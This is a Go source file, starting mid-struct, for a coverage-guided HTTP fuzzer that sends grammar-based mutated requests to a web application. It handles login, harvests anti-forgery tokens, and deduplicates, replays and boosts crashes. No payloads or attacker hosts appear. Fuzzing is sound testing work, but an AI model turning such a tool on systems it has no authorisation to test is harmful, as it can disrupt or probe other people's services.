	latencyTotalMS   float64
	latencySamples   int
	completedSinceCV int
	stallCounter     int

	learnedByEndpoint    map[string]int
	uniqueCrashKeys      map[string]struct{}
	crashLog             []map[string]any
	blockedEndpoints     map[string]struct{}
	forceFormEndpoints   map[string]struct{}
	antiForgeryHarvestAt map[string]time.Time
	antiForgeryLearned   int
	antiForgeryMu        sync.RWMutex
	harvestMu            sync.Mutex
	antiForgeryTokens    map[string]time.Time
	antiForgeryLastPrune time.Time

	crashWriter  *JSONLWriter
	uniqueWriter *JSONLWriter
	findings     []CrashFinding
	pocCount     int

	currentConcurrency       int
	lastTuneTS               time.Time
	lastTuneDone             int
	lastTuneErr              int
	lastTuneLatMS            float64
	baselineLatMS            float64
	lastUIRender             time.Time
	uiInline                 bool
	uiWidthLocked            int
	eventLog                 []string
	requestSamples           []string
	lastEdgeEvent            time.Time
	coverageSaturationWarned bool
	lastValueSampleTS        time.Time
	learnSampleCounter       int
	stoppedByUser            bool

	triageTimeSpent time.Duration

	// Crash amplification: endpoint key -> requests remaining at boosted weight.
	// Triggered only by unique crashes; capped per endpoint to prevent monopolization.
	crashBoost map[string]int
	// How many times we've boosted each endpoint (to cap total boost budget).
	crashBoostCount map[string]int
	// Replay queue: targeted follow-up requests queued after a unique crash.
	replayQueue []WorkItem
	// Replay budget consumed per endpoint to prevent single-route monopolization.
	replayByEndpoint map[string]int
	// Rate-limit re-auth attempts to avoid hammering the auth endpoint.
	lastAuthRefresh time.Time
	// Last time we reset the coverage bitmap (triggered on high saturation).
	lastCoverageReset time.Time
	// Monotonic request id sequence for low-overhead per-request attribution.
	requestIDSeq uint64
}

func NewFuzzer(cfg Config) (*Fuzzer, error) {
	target := strings.TrimRight(envOr("TARGET_HOST", "http://localhost:5200"), "/")
	shmHost := strings.TrimRight(envOr("SHM_HOST", target), "/")

	transport := &http.Transport{
		MaxIdleConns:        4096,
		MaxIdleConnsPerHost: 1024,
		IdleConnTimeout:     60 * time.Second,
		DisableCompression:  true,
	}
	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Timeout:   time.Duration(math.Max(0.1, cfg.RequestTimeoutSec) * float64(time.Second)),
		Transport: transport,
		Jar:       jar,
	}

	templatesPath := cfg.TemplatesJSON
	if templatesPath == "" {
		templatesPath = filepath.Join(cfg.GrammarDir, "templates.export.json")
	}
	if shouldRefreshTemplates(cfg, templatesPath) {
		fmt.Printf("Refreshing templates from grammar: %s\n", filepath.Join(cfg.GrammarDir, "grammar.py"))
		if err := exportTemplates(cfg.ExporterPath, cfg.GrammarDir, templatesPath); err != nil {
			return nil, err
		}
	}
	templates, err := loadTemplates(templatesPath)
	if err != nil {
		return nil, err
	}
	if len(templates) == 0 {
		return nil, errors.New("no templates loaded")
	}

	dictPath := resolveDictionaryPath(cfg.DictPath, cfg.GrammarDir)
	dict, err := loadDict(dictPath)
	if err != nil {
		return nil, fmt.Errorf("failed to load dictionary: %w", err)
	}
	if dictPath != "" {
		fmt.Printf("Loaded dictionary: %s\n", dictPath)
	}

	coverage := CoverageReader(&HTTPCoverageReader{client: client, shmHost: shmHost})
	if cfg.DirectSHM {
		coverage = &SHMCoverageReader{path: cfg.SHMPath, size: cfg.CoverageBitmapSize, mode: cfg.SHMReadMode}
	}

	crashWriter, err := NewJSONLWriter(cfg.CrashFile)
	if err != nil {
		return nil, err
	}
	uniqueWriter, err := NewJSONLWriter(cfg.UniqueCrashFile)
	if err != nil {
		_ = crashWriter.Close()
		return nil, err
	}
	if err := ensureFileExists(cfg.SummaryFile, []byte("{}\n")); err != nil {
		_ = crashWriter.Close()
		_ = uniqueWriter.Close()
		return nil, err
	}
	if err := ensureFileExists(cfg.ReportFile, []byte("{\"bugs\":[]}\n")); err != nil {
		_ = crashWriter.Close()
		_ = uniqueWriter.Close()
		return nil, err
	}

	f := &Fuzzer{
		cfg:                  cfg,
		target:               target,
		shm:                  shmHost,
		client:               client,
		coverage:             coverage,
		templates:            templates,
		tmplByID:             map[int]*Template{},
		meta:                 map[int]TemplateMeta{},
		tmplEPKey:            map[int]string{},
		depIndex:             map[int]DepInfo{},
		depConsumers:         map[string][]int{},
		idConsumers:          map[string][]int{},
		templatePriority:     map[int]float64{},
		runtime:              newRuntimeStore(),
		dict:                 dict,
		seedSampler:          NewFenwickSampler(),
		endpointStats:        map[string]*EndpointStats{},
		mutationStats:        map[string]*MutationStats{},
		authBlocked:          map[string]*AuthBlockedState{},
		clientSamples:        map[string][]string{},
		learnedByEndpoint:    map[string]int{},
		uniqueCrashKeys:      map[string]struct{}{},
		blockedEndpoints:     map[string]struct{}{},
		forceFormEndpoints:   map[string]struct{}{},
		antiForgeryHarvestAt: map[string]time.Time{},
		antiForgeryTokens:    map[string]time.Time{},
		authHeaders:          map[string]string{},
		crashBoost:           map[string]int{},
		crashBoostCount:      map[string]int{},
		replayQueue:          make([]WorkItem, 0, 64),
		replayByEndpoint:     map[string]int{},
		identities:           nil,
		identityOrder:        nil,
		identityCursor:       0,
		crashWriter:          crashWriter,
		uniqueWriter:         uniqueWriter,
		findings:             make([]CrashFinding, 0, 64),
		raceQueue:            make([]WorkItem, 0, 128),
		currentConcurrency: clampInt(cfg.Concurrency,
			clampInt(cfg.MinConcurrency, 1, 4096),
			clampInt(cfg.MaxConcurrency, 1, 4096),
		),
		uiInline:       isTerminal(os.Stdout),
		eventLog:       make([]string, 0, 8),
		requestSamples: make([]string, 0, 8),
		uiWidthLocked:  0,
	}
	for i := range f.templates {
		t := &f.templates[i]
		f.tmplByID[t.ID] = t
	}
	return f, nil
}

func shouldRefreshTemplates(cfg Config, templatesPath string) bool {
	if cfg.RefreshTemplates || !fileExists(templatesPath) {
		return true
	}

	grammarPath := filepath.Join(cfg.GrammarDir, "grammar.py")
	tplInfo, tplErr := os.Stat(templatesPath)
	grInfo, grErr := os.Stat(grammarPath)
	if tplErr != nil || grErr != nil {
		return false
	}

	return grInfo.ModTime().After(tplInfo.ModTime())
}

func (f *Fuzzer) Close() {
	_ = f.coverage.Close()
	_ = f.crashWriter.Close()
	_ = f.uniqueWriter.Close()
}

func (f *Fuzzer) Run() error {
	fmt.Printf("Time budget: %.1f minutes\n", f.cfg.TimeBudgetMinutes)
	fmt.Printf("Concurrency: %d (adaptive=%v min=%d max=%d)\n", f.currentConcurrency, f.cfg.AdaptiveConcurrency, f.cfg.MinConcurrency, f.cfg.MaxConcurrency)
	fmt.Printf("Output files: crash=%s unique=%s summary=%s report=%s\n",
		f.cfg.CrashFile, f.cfg.UniqueCrashFile, f.cfg.SummaryFile, f.cfg.ReportFile)
	fmt.Printf("Content-Type adaptation: %v\n", f.cfg.AdaptiveContentType)
	fmt.Printf("Anti-forgery auto-harvest: %v (field=%s header=%s cooldown=%.1fs)\n",
		f.cfg.AutoAntiForgery, f.cfg.AntiForgeryField, f.cfg.AntiForgeryHeader, f.cfg.AntiForgeryCooldown)
	fmt.Printf("Anti-forgery learning: sample=%.2f max_tokens=%d ttl=%.0fs\n",
		f.cfg.AntiForgerySampleRate, f.cfg.AntiForgeryMaxTokens, f.cfg.AntiForgeryTokenTTL)
	fmt.Printf("Coverage bitmap target size: %d bytes\n", f.cfg.CoverageBitmapSize)
	fmt.Printf("Endpoint stall throttle: stall_reqs=%d zero_edge_reqs=%d\n", f.cfg.EndpointStallReqs, f.cfg.EndpointZeroEdgeReqs)
	fmt.Printf("UI endpoint view: sort=%s rotate=%v every=%.1fs\n", f.cfg.UIEndpointSort, f.cfg.UIEndpointRotate, f.cfg.UIEndpointRotateSec)
	fmt.Printf("Advanced: triage=%v repro_runs=%d minimize=%v race=%v burst=%d source_priority=%v multi_identity=%v\n",
		f.cfg.CrashTriage, f.cfg.ReproRuns, f.cfg.MinimizeCrash, f.cfg.RaceMode, f.cfg.RaceBurst, f.cfg.SourceAwarePriority, f.cfg.MultiIdentity)
	fmt.Printf("Crash dedup: mode=%s mutation=%v query_values=%v\n",
		f.cfg.CrashSignatureMode, f.cfg.CrashSigMutation, f.cfg.CrashSigQueryValues)
	fmt.Printf("Crash replay: prob=%.2f count=%d queue_max=%d endpoint_max=%d\n",
		f.cfg.CrashReplayProb, f.cfg.CrashReplayCount, f.cfg.CrashReplayQueueMax, f.cfg.CrashReplayPerEndpoint)
	fmt.Printf("Crash boost: requests=%d max_per_endpoint=%d weight=%.2f\n",
		f.cfg.CrashBoostRequests, f.cfg.CrashBoostMaxPerEndpoint, f.cfg.CrashBoostWeight)
	if f.cfg.SkipEndpointOn500 {
		fmt.Printf("Endpoint policy: stop fuzzing endpoint after first HTTP 500\n")
	}

	if err := f.authenticate(); err != nil {
		fmt.Printf("Auth warning: %v (continuing anonymous)\n", err)
	} else if f.token != "" {
		fmt.Printf("Authenticated (token available)\n")
	} else if f.hasAuthContext() {
		fmt.Printf("Authenticated (cookie/header auth available)\n")
	}
	f.initAuthIdentities()
	fmt.Printf("Identities loaded: %d (mode=%s)\n", len(f.identities), f.cfg.IdentitySampleMode)

	if err := f.coverage.Init(); err != nil {
		return fmt.Errorf("coverage init failed: %w", err)
	}
	if f.cfg.DirectSHM {
		if shmReader, ok := f.coverage.(*SHMCoverageReader); ok {
			fmt.Printf("Direct SHM read mode: requested=%s active=%s\n", f.cfg.SHMReadMode, shmReader.ActiveMode())
		}
	}
	if err := f.coverage.Reset(); err != nil {
		fmt.Printf("Coverage reset warning: %v\n", err)
	}
	// Also reset via HTTP so the .NET CoverageExtensions sees a clean bitmap
	// (in case the SHM file-level reset isn't visible through the mmap yet).
	if f.cfg.DirectSHM {
		httpReset := &HTTPCoverageReader{
			client:  &http.Client{Timeout: 5 * time.Second},
			shmHost: f.shm,
		}
		if err := httpReset.Reset(); err != nil {
			fmt.Printf("HTTP /shm/reset warning: %v\n", err)
		}
	}
	edges, err := f.coverage.GetEdges()
	if err != nil {
		return fmt.Errorf("coverage read failed: %w", err)
	}
	fmt.Printf("Coverage after reset: %d edges (should be 0)\n", edges)
	f.startEdges = edges
	f.currentEdges = edges
	f.coverageCapacity = maxInt(0, f.coverage.Capacity())
	if f.coverageCapacity > 0 {
		fmt.Printf("Coverage bitmap active size: %d bytes\n", f.coverageCapacity)
	}

	f.buildTemplateMetaAndDependencies()
	if f.cfg.SourceAwarePriority {
		boosted := f.loadSourceAwarePriority()
		fmt.Printf("Source-aware priority: boosted templates=%d\n", boosted)
	}
	if len(f.activeIDs) == 0 {
		return errors.New("no active templates after filtering")
	}
	fmt.Printf("Templates loaded: %d\n", len(f.activeIDs))

	boot := f.bootstrapRuntimeValues()
	if boot > 0 {
		fmt.Printf("Bootstrap learned runtime values: %d\n", boot)
	}

	f.seedBaselineCorpus()
	f.preHarvestAntiForgeryTokens()
	return f.mainLoop()
}

func (f *Fuzzer) authenticate() error {
	f.authHeaders = parseAuthHeadersJSON(os.Getenv("AUTH_HEADERS_JSON"))
	if cookie := strings.TrimSpace(os.Getenv("AUTH_COOKIE")); cookie != "" {
		setHeaderCI(f.authHeaders, "Cookie", cookie)
	}
	f.seedAuthContextValues()
	if tok := strings.TrimSpace(os.Getenv("AUTH_TOKEN")); tok != "" {
		f.token = tok
		return nil
	}
	if f.hasAuthContext() {
		return nil
	}

	authURL := strings.TrimSpace(envOr("AUTH_URL", "/api/authenticate"))
	authMethod := strings.ToUpper(strings.TrimSpace(envOr("AUTH_METHOD", "POST")))
	authBody := os.Getenv("AUTH_BODY")
	authContentType := strings.TrimSpace(envOr("AUTH_CONTENT_TYPE", "application/json"))
	tokenField := envOr("AUTH_TOKEN_FIELD", "token")
	if authMethod == "" {
		authMethod = http.MethodPost
	}
	u := f.target + authURL
	var bodyReader io.Reader
	if strings.TrimSpace(authBody) != "" {
		bodyReader = strings.NewReader(authBody)
	}
	req, err := http.NewRequest(authMethod, u, bodyReader)
	if err != nil {
		return err
	}
	for k, v := range f.authHeaders {
		if strings.EqualFold(k, "Host") || strings.EqualFold(k, "Content-Length") || strings.EqualFold(k, "Transfer-Encoding") {
			continue
		}
		req.Header.Set(k, v)
	}
	if strings.TrimSpace(authBody) != "" && authContentType != "" {
		req.Header.Set("Content-Type", authContentType)
	}
	resp, err := f.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 400 {
		b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		return fmt.Errorf("auth status=%d body=%s", resp.StatusCode, string(b))
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	text := strings.TrimSpace(string(body))
	var js any
	if err := json.Unmarshal(body, &js); err == nil {
		switch tv := js.(type) {
		case string:
			if len(tv) > 10 {
				f.token = tv
				return nil
			}
		case map[string]any:
			if v, ok := tv[tokenField]; ok {
				t := strings.TrimSpace(toString(v))
				if len(t) > 10 {
					f.token = t
					return nil
				}
			}
		}
	}
	text = strings.Trim(text, `"`)
	if len(text) > 10 {
		f.token = text
		return nil
	}
	if f.hasAuthContext() {
		return nil
	}
	return errors.New("token/session not found")
}

func (f *Fuzzer) hasSessionCookies() bool {
	if f == nil || f.client == nil || f.client.Jar == nil {
		return false
	}
	u, err := url.Parse(f.target)
	if err != nil || u == nil {
		return false
	}
	return len(f.client.Jar.Cookies(u)) > 0
}

func (f *Fuzzer) hasAuthContext() bool {
	if strings.TrimSpace(f.token) != "" {
		return true
	}
	if len(f.authHeaders) > 0 {
		return true
	}
	return f.hasSessionCookies()
}

func (f *Fuzzer) seedAuthContextValues() {
	if f == nil || f.runtime == nil {
		return
	}
}

func (f *Fuzzer) preHarvestAntiForgeryTokens() int {
	if !f.cfg.AutoAntiForgery || !f.hasAuthContext() {
		return 0
	}
	if learned := f.harvestAntiForgeryForPath("/"); learned > 0 {
		fmt.Printf("Pre-harvested %d anti-forgery token(s) from /\n", learned)
		return learned
	}
	for _, tid := range f.activeIDs {
		meta := f.meta[tid]
		if meta.Method != "GET" || strings.Contains(meta.Norm, "{") {
			continue
		}
		learned := f.harvestAntiForgeryForPath(meta.Norm)
		if learned > 0 {
			fmt.Printf("Pre-harvested %d anti-forgery token(s) from %s\n", learned, meta.Norm)
			return learned
		}
	}
	return 0
}

func (f *Fuzzer) buildTemplateMetaAndDependencies() {
	f.activeIDs = f.activeIDs[:0]
	endpointProfiles := map[string]*EndpointContentProfile{}
	for _, t := range f.templates {
		item, err := f.renderTemplate(t.ID, "none", 1, -1)
		if err != nil {
			continue
		}
		if strings.HasPrefix(item.Path, "/shm/") {
			continue
		}
		authURL := strings.TrimSpace(envOr("AUTH_URL", "/api/authenticate"))
		if authURL != "" && strings.HasPrefix(item.Path, authURL) {
			continue
		}
		norm := normalizePath(item.Path)
		epKey := endpointKey(item.Method, norm)
		ct := canonicalContentType(item.Headers)
		f.meta[t.ID] = TemplateMeta{Method: item.Method, Path: item.Path, Norm: norm, ContentType: ct}
		f.tmplEPKey[t.ID] = epKey
		f.activeIDs = append(f.activeIDs, t.ID)

		prof := endpointProfiles[epKey]
		if prof == nil {
			prof = &EndpointContentProfile{}
			endpointProfiles[epKey] = prof
		}
		switch {
		case strings.Contains(ct, "application/json"):
			prof.JSON++
		case strings.Contains(ct, "application/x-www-form-urlencoded"):
			prof.Form++
		case strings.Contains(ct, "multipart/form-data"):
			prof.Multipart++
		case ct != "":
			prof.Other++
		}
	}

	if f.cfg.AdaptiveContentType {
		for epKey, prof := range endpointProfiles {
			parts := strings.SplitN(epKey, " ", 2)
			if len(parts) != 2 {
				continue
			}
			method := strings.TrimSpace(parts[0])
			path := strings.TrimSpace(parts[1])
			if !isWriteMethod(method) {
				continue
			}
			if isAPILikePath(path) {
				continue
			}
			// If route has both JSON and form-like templates, prefer forms to avoid MVC/FormValueRequired noise.
			if prof.JSON > 0 && (prof.Form > 0 || prof.Multipart > 0) {
				f.forceFormEndpoints[epKey] = struct{}{}
			}
		}
	}
	if n := len(f.forceFormEndpoints); n > 0 {
		fmt.Printf("Request adaptation: preselected form-data on %d non-API write endpoints\n", n)
	}

	for _, tid := range f.activeIDs {
		t := f.tmplByID[tid]
		if t == nil {
			continue
		}
		info := DepInfo{
			Reads:    setFromSlice(t.Reads),
			Writes:   setFromSlice(t.Writes),
			IDReads:  map[string]struct{}{},
			IDWrites: map[string]struct{}{},
		}
		for dep := range info.Reads {
			for _, k := range inferDependencyKeys(dep) {
				if isIDLikeKey(k) {
					info.IDReads[canonicalKey(k)] = struct{}{}
				}
			}
		}
		for dep := range info.Writes {
			for _, k := range inferDependencyKeys(dep) {
				if isIDLikeKey(k) {
					info.IDWrites[canonicalKey(k)] = struct{}{}
				}
			}
		}
		for _, s := range t.Segments {
			if s.Kind == "custom_payload" && isIDLikeKey(s.PayloadKey) {
				info.IDReads[canonicalKey(s.PayloadKey)] = struct{}{}
			}
		}
		for _, token := range extractPathParamNames(t.RequestID) {
			if isIDLikeKey(token) {
				info.IDReads[canonicalKey(token)] = struct{}{}
			}
		}
		meta := f.meta[tid]
		if meta.Method == "POST" || meta.Method == "PUT" || meta.Method == "PATCH" {
			if rid := inferResourceIDKeyFromPath(meta.Norm); rid != "" && isIDLikeKey(rid) {
				info.IDWrites[canonicalKey(rid)] = struct{}{}
			}
		}
		f.depIndex[tid] = info

		for dep := range info.Reads {
			f.depConsumers[dep] = appendUniqueInt(f.depConsumers[dep], tid)
		}
		for idk := range info.IDReads {
			f.idConsumers[idk] = appendUniqueInt(f.idConsumers[idk], tid)
		}
	}

	producers := 0
	consumers := 0
	for _, tid := range f.activeIDs {
		info := f.depIndex[tid]
		if len(info.Writes) > 0 {
			producers++
		}
		if len(info.Reads) > 0 {
			consumers++
		}
	}
	fmt.Printf("Dependency graph: producers=%d consumers=%d\n", producers, consumers)
}

func (f *Fuzzer) seedBaselineCorpus() {
	for _, tid := range f.activeIDs {
		item, err := f.renderTemplate(tid, "none", 1, -1)
		if err != nil {
			continue
		}
		seed := Seed{
			TemplateID:   tid,
			Payload:      item.Raw,
			Energy:       1.0,
			MutationName: "seed",
		}
		f.corpus = append(f.corpus, seed)
		f.seedSampler.Append(seed.Energy)
	}
	fmt.Printf("Baseline corpus seeded: %d\n", len(f.corpus))
}

func (f *Fuzzer) bootstrapRuntimeValues() int {
	if f.cfg.BootstrapMax <= 0 {
		return 0
	}
	cands := make([]int, 0, len(f.activeIDs))
	seen := map[string]struct{}{}
	for _, tid := range f.activeIDs {
		meta := f.meta[tid]
		if meta.Method != "GET" {
			continue
		}
		if strings.Contains(meta.Norm, "{") || strings.Contains(meta.Norm, "}") {
			continue
		}
		if _, ok := seen[meta.Norm]; ok {
			continue
		}
		seen[meta.Norm] = struct{}{}
		cands = append(cands, tid)
	}
	shuffleInts(cands)
	if len(cands) > f.cfg.BootstrapMax {
		cands = cands[:f.cfg.BootstrapMax]
	}

	// Parallel bootstrap with 3s total deadline to avoid slow startup.
	type bootstrapResult struct {
		body    string
		headers map[string]string
	}
	resultCh := make(chan bootstrapResult, len(cands))
	concurrency := minInt(8, len(cands))
	sem := make(chan struct{}, concurrency)
	deadline := time.After(3 * time.Second)
	var wg sync.WaitGroup

	for _, tid := range cands {
		select {
		case <-deadline:
			goto done
		default:
		}
		item, err := f.renderTemplate(tid, "none", 1, -1)
		if err != nil {
			continue
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(it WorkItem) {
			defer wg.Done()
			defer func() { <-sem }()
			res := f.sendOne(it)
			if res.Err == nil && res.Status == 200 {
				resultCh <- bootstrapResult{body: res.Body, headers: res.Headers}
			}
		}(item)
	}
done:
	go func() { wg.Wait(); close(resultCh) }()

	learned := 0
	for r := range resultCh {
		learned += f.learnFromResponse(r.body, r.headers)
	}
	return learned
}

func (f *Fuzzer) startStopInputListener(stopCh chan<- struct{}) {
	if !isTerminal(os.Stdin) {
		return
	}
	go func() {
		reader := bufio.NewReader(os.Stdin)
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				return
			}
			cmd := strings.ToLower(strings.TrimSpace(line))
			switch cmd {
			case "q", "quit", "s", "stop", "exit":
				select {
				case stopCh <- struct{}{}:
				default:
				}
				return
			}
		}
	}()
}

func (f *Fuzzer) mainLoop() error {
	epochs := []Epoch{
		{Name: "Baseline", Fraction: 0.05, Mode: "none"},
		{Name: "Harvest", Fraction: 0.25, Mode: "harvest"},
		{Name: "Deterministic", Fraction: 0.25, Mode: "mutate"},
		{Name: "Havoc", Fraction: 0.35, Mode: "havoc"},
		{Name: "Splicing", Fraction: 0.10, Mode: "havoc"},
	}

	// Adaptive epoch rebalancing: track edges found per epoch and shift budget
	// from unproductive phases to productive ones (like AFL++'s pilot/core modes).
	epochEdgesAtStart := map[string]int{}
	epochReqsAtStart := map[string]int{}

	f.startTime = time.Now()
	f.lastTuneTS = time.Now()
	f.lastUIRender = time.Time{}
	f.lastEdgeEvent = time.Time{}
	lastEpoch := ""
	workCh := make(chan WorkItem, maxInt(128, f.cfg.MaxConcurrency*4))
	resultCh := make(chan SendResult, maxInt(512, f.cfg.MaxConcurrency*16))
	stopCh := make(chan struct{}, 1)
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	defer signal.Stop(sigCh)
	f.startStopInputListener(stopCh)

	markStopped := func(reason string) {
		if f.stoppedByUser {
			return
		}
		f.stoppedByUser = true
		f.addEvent("STOP requested: " + reason)
	}

	workerCount := maxInt(1, f.cfg.MaxConcurrency)
	for i := 0; i < workerCount; i++ {
		go func() {
			for it := range workCh {
				resultCh <- f.sendOne(it)
			}
		}()
	}
	defer close(workCh)

	tick := time.NewTicker(100 * time.Millisecond)
	defer tick.Stop()

	pending := 0
	timeBudget := time.Duration(f.cfg.TimeBudgetMinutes * float64(time.Minute))

	for time.Since(f.startTime) < timeBudget && !f.stoppedByUser {
		select {
		case <-stopCh:
			markStopped("input command")
			break
		case <-sigCh:
			markStopped("signal")
			break
		default:
		}

		epIdx, ep := currentEpoch(epochs, time.Since(f.startTime), timeBudget)
		if ep.Name != lastEpoch {
			// On epoch transition: rebalance remaining time based on productivity.
			if lastEpoch != "" {
				prevEdges := f.currentEdges - epochEdgesAtStart[lastEpoch]
				prevReqs := f.totalDone - epochReqsAtStart[lastEpoch]
				edgeRate := 0.0
				if prevReqs > 0 {
					edgeRate = float64(prevEdges) / float64(prevReqs)
				}
				// If the phase was unproductive (< 0.001 edges/req after decent sample),
				// steal half its remaining fraction and give to Havoc.
				if prevReqs > 200 && edgeRate < 0.001 && lastEpoch != "Baseline" {
					for i := range epochs {
						if epochs[i].Name == lastEpoch {
							stolen := epochs[i].Fraction * 0.3
							epochs[i].Fraction -= stolen
							for j := range epochs {
								if epochs[j].Name == "Havoc" {
									epochs[j].Fraction += stolen
									break
								}
							}
							f.addEvent(fmt.Sprintf("REBALANCE %s -> Havoc (%.0f%% stolen, edgeRate=%.5f)", lastEpoch, stolen*100, edgeRate))
							break
						}
					}
				}
			}
			epochEdgesAtStart[ep.Name] = f.currentEdges
			epochReqsAtStart[ep.Name] = f.totalDone
			f.addEvent(fmt.Sprintf("EPOCH %d: %s", epIdx+1, ep.Name))
			lastEpoch = ep.Name
		}
		desired := f.currentConcurrency
		if ep.Name == "Baseline" && f.cfg.SequentialBaseline {
			desired = 1
		}
		queueSaturated := false
		for pending < desired {
			if len(workCh) >= cap(workCh) {
				break
			}
			item, ok := f.buildWorkItem(epIdx, ep)
			if !ok {
				break
			}
			select {
			case workCh <- item:
				pending++
				f.totalSent++
			default:
				// Worker queue is saturated; let workers catch up.
				queueSaturated = true
			}
			if pending >= desired || queueSaturated {
				break
			}
		}

		if pending == 0 {
			select {
			case <-stopCh:
				markStopped("input command")
			case <-sigCh:
				markStopped("signal")
			case <-tick.C:
			default:
				time.Sleep(10 * time.Millisecond)
			}
			f.renderUI(ep.Name, epIdx, pending)
			f.tuneConcurrency()
			continue
		}

		select {
		case <-stopCh:
			markStopped("input command")
		case <-sigCh:
			markStopped("signal")
		case res := <-resultCh:
			pending--
			f.handleResult(res)
		case <-tick.C:
		default:
			select {
			case <-stopCh:
				markStopped("input command")
			case <-sigCh:
				markStopped("signal")
			case res := <-resultCh:
				pending--
				f.handleResult(res)
			case <-tick.C:
			}
		}

		f.renderUI(ep.Name, epIdx, pending)
		f.tuneConcurrency()
	}

	// Drain a short tail.
	drainDeadline := time.Now().Add(2 * time.Second)
	for pending > 0 && time.Now().Before(drainDeadline) {
		select {
		case <-stopCh:
			markStopped("input command")
		case <-sigCh:
			markStopped("signal")
		case res := <-resultCh:
			pending--
			f.handleResult(res)
		case <-tick.C:
		}
	}

	_ = f.crashWriter.Flush()
	_ = f.uniqueWriter.Flush()
	f.printFinalReport()
	return nil
}

func (f *Fuzzer) buildWorkItem(epIdx int, ep Epoch) (WorkItem, bool) {
	// Drain crash replay queue probabilistically to avoid monopolization by one crashing endpoint.
	if len(f.replayQueue) > 0 && rand.Float64() < clampFloat(f.cfg.CrashReplayProb, 0.0, 1.0) {
		for len(f.replayQueue) > 0 {
			item := f.replayQueue[0]
			f.replayQueue = f.replayQueue[1:]
			if f.isTemplateBlocked(item.TemplateID) {
				continue
			}
			item = f.decorateWorkItem(item)
			return item, true
		}
	}

	for len(f.raceQueue) > 0 {
		item := f.raceQueue[0]
		f.raceQueue = f.raceQueue[1:]
		if f.isTemplateBlocked(item.TemplateID) {
			continue
		}
		item = f.decorateWorkItem(item)
		return item, true
	}

	for len(f.sequenceQueue) > 0 && rand.Float64() < clampFloat(f.cfg.SequenceProb, 0.0, 1.0) {
		item := f.sequenceQueue[0]
		f.sequenceQueue = f.sequenceQueue[1:]
		if f.isTemplateBlocked(item.TemplateID) {
			continue
		}
		item = f.decorateWorkItem(item)
		return item, true
	}

	if len(f.activeIDs) == 0 {
		return WorkItem{}, false
	}

	tid := -1
	if ep.Name == "Harvest" {
		tid = f.pickHarvestTemplate()
	} else if (ep.Mode == "mutate" || ep.Mode == "havoc") && len(f.corpus) > 0 {
		for tries := 0; tries < 8; tries++ {
			seedIdx := f.pickSeed()
			if seedIdx < 0 {
				break
			}
			seed := &f.corpus[seedIdx]
			if f.isTemplateBlocked(seed.TemplateID) {
				f.seedSampler.Set(seedIdx, 0)
				continue
			}
			seed.TimesChosen++
			seed.Energy = math.Max(0.5, seed.Energy*0.995)
			f.seedSampler.Set(seedIdx, seed.Energy)
			it, err := f.renderTemplate(seed.TemplateID, ep.Mode, f.havocDepth(ep.Mode), seedIdx)
			if err == nil {
				it.EpochName = ep.Name
				it.EpochIdx = epIdx
				if ep.Name == "Splicing" && len(f.corpus) >= 2 {
					it.MutationLabel += "+splice"
					it.MutationName = "splicing"
				}
				it = f.decorateWorkItem(it)
				return it, true
			}
		}
		tid = f.pickWeightedTemplate()
	} else {
		tid = f.pickWeightedTemplate()
	}

	if tid < 0 || f.isTemplateBlocked(tid) {
		return WorkItem{}, false
	}
	it, err := f.renderTemplate(tid, ep.Mode, f.havocDepth(ep.Mode), -1)
	if err != nil {
		return WorkItem{}, false
	}
	it.EpochName = ep.Name
	it.EpochIdx = epIdx
	it = f.decorateWorkItem(it)
	return it, true
}

func (f *Fuzzer) templateEndpointKey(tid int) string {
	if k, ok := f.tmplEPKey[tid]; ok && k != "" {
		return k
	}
	m, ok := f.meta[tid]
	if !ok {
		return ""
	}
	return endpointKey(m.Method, m.Norm)
}

func (f *Fuzzer) isTemplateBlocked(tid int) bool {
	k := f.templateEndpointKey(tid)
	if k == "" {
		return false
	}
	_, blocked := f.blockedEndpoints[k]
	return blocked
}

func (f *Fuzzer) shouldForceForm(method, path string) bool {
	if !f.cfg.AdaptiveContentType {
		return false
	}
	if !isWriteMethod(method) {
		return false
	}
	_, ok := f.forceFormEndpoints[endpointKey(method, normalizeEndpointPath(path))]
	return ok
}

func (f *Fuzzer) adaptPathParamsFromRuntime(t *Template, path string) (string, []string) {
	if t == nil || t.RequestID == "" || !strings.Contains(t.RequestID, "{") || !strings.Contains(path, "/") {
		return path, nil
	}
	rawPath := path
	query := ""
	if i := strings.Index(rawPath, "?"); i >= 0 {
		query = rawPath[i:]
		rawPath = rawPath[:i]
	}
	pattern := normalizePath(t.RequestID)
	actual := normalizePath(rawPath)
	pSegs := splitPathTokens(pattern)
	aSegs := splitPathTokens(actual)
	if len(pSegs) == 0 || len(pSegs) != len(aSegs) {
		return path, nil
	}

	changed := false
	labels := make([]string, 0, 4)
	for i := 0; i < len(pSegs); i++ {
		name, ok := pathPlaceholderName(pSegs[i])
		if !ok {
			continue
		}
		cur := aSegs[i]
		if !isPathPlaceholderValue(cur) {
			continue
		}
		cand := f.runtime.pickCustomPayloadValue(name, f.dict, cur)
		cand = normalizePathParamValue(cand, cur)
		if cand == "" || cand == cur {
			continue
		}
		aSegs[i] = cand
		labels = append(labels, "path_"+name)
		changed = true
	}
	if !changed {
		return path, nil
	}
	out := "/" + strings.Join(aSegs, "/")
	if query != "" {
		out += query
	}
	return out, dedupStrings(labels)
}

func (f *Fuzzer) blockEndpointByTemplateID(tid int) int {
	k := f.templateEndpointKey(tid)
	if k == "" {
		return 0
	}
	if _, ok := f.blockedEndpoints[k]; ok {
		return 0
	}
	f.blockedEndpoints[k] = struct{}{}

	removed := 0
	next := make([]int, 0, len(f.activeIDs))
	for _, id := range f.activeIDs {
		if f.templateEndpointKey(id) == k {
			removed++
			continue
		}
		next = append(next, id)
	}
	f.activeIDs = next

	if len(f.sequenceQueue) > 0 {
		q := make([]WorkItem, 0, len(f.sequenceQueue))
		for _, wi := range f.sequenceQueue {
			if f.templateEndpointKey(wi.TemplateID) == k {
				continue
			}
			q = append(q, wi)
		}
		f.sequenceQueue = q
	}

	if len(f.corpus) > 0 {
		for i := range f.corpus {
			if f.templateEndpointKey(f.corpus[i].TemplateID) == k {
				f.seedSampler.Set(i, 0)
			}
		}
	}
	return removed
}

